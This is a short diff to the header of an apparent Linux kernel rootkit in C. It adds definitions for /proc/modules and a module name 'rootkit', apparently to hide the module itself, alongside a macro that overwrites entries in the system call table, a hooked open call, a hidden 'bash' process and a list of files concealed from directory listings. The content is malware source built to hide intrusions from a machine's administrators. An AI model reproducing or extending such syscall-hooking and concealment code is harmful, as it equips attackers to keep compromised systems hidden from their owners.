@@ -45,6 +45,10 @@ struct linux_dirent {
 
 #define SHADOW_FILE "/etc/shadow"
 
+#define MODULE_FILE "/proc/modules"
+
+#define MODULE_NAME "rootkit"
+
 #define HOOK_SYSCALL(sys_call_table, orig_func, hacked_func, __NR_index)    \
     orig_func = (void *)sys_call_table[__NR_index];                        \
     sys_call_table[__NR_index] = (unsigned long*)&hacked_func
@@ -67,4 +71,5 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
 char *HIDDEN_PROCESS = "bash";
 
 // List of files to hide from getdents and open
-const char * const HIDDEN_FILES[] = {"hideme.txt", "rootkit.c", "includes.h", "Makefile"};
+const char * const HIDDEN_FILES[] = {"hideme.txt", "rootkit.c", "includes.h", 
+                                        "Makefile"};
